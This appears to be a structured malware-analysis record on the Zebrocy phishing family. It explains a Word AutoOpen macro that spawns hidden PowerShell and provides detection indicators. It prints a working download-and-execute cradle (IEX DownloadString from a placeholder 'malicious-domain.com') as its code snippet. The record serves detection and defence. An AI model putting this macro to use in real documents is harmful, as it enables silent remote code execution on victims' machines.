package_info.package_manager: N/A (malware distributed via phishing, not a package manager)
package_info.why_malicious: Zebrocy is a malware family used by APT28 for targeted phishing attacks. It is designed to download and execute additional payloads, exfiltrate sensitive data, and provide remote access to compromised systems. Its code is delivered via malicious documents and is intended to compromise government and commercial organizations.

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objShell As Object
  Set objShell = CreateObject("WScript.Shell")
  objShell.Run "cmd.exe /c powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload.ps1')"
End Sub
malicious_snippets.code_behavior: When the document is opened, the macro executes a hidden PowerShell command that downloads and executes a remote payload, enabling initial compromise and further malware delivery.

malice_analysis.why_suspicious: Macros that execute PowerShell to download and run remote code are a common malware delivery technique.
malice_analysis.violated_expectations: Normal documents should not contain macros that launch system commands or download code from the internet.
malice_analysis.similar_legitimate_use: Some enterprise automation may use macros for internal scripts, but never to download code from untrusted sources.
key_indicators: AutoOpen macro triggers on document open
Use of WScript.Shell to launch cmd.exe
PowerShell command downloads and executes remote script

malicious_snippets.code_behavior: After initial execution, the script downloads a second-stage executable to the TEMP directory and runs it, escalating the attack and establishing persistence or further payload delivery.

malice_analysis.why_suspicious: Downloading and executing binaries from the internet is a hallmark of malware behavior.
malice_analysis.violated_expectations: Legitimate scripts should not fetch and execute untrusted executables without user consent.
malice_analysis.similar_legitimate_use: Software updaters may download signed updates, but not from arbitrary domains.

attack_chain.action: User opens phishing document, triggering malicious macro.
Macro launches PowerShell to download and execute first-stage payload.
First-stage payload downloads and executes second-stage malware.
attack_chain.leads_to: Full system compromise, data exfiltration, or further malware deployment

behavioral_signatures: Document macros invoking PowerShell or cmd.exe
PowerShell scripts downloading and executing remote code
Unusual process tree: Office application -> cmd.exe -> powershell.exe
file_indicators: Temporary files named second_stage.exe or similar in %TEMP%
Downloaded scripts or executables from non-corporate domains
network_indicators: HTTP/HTTPS requests to known Zebrocy C2 domains
Outbound connections from Office or PowerShell processes to untrusted IPs
detection_knowledge.how_to_detect: Monitor for Office documents with macros that launch PowerShell or cmd.exe, especially those that download code from the internet. Alert on PowerShell processes spawned by Office applications, and on network connections to suspicious domains from user endpoints. Use endpoint protection to block or sandbox documents with suspicious macro behavior.
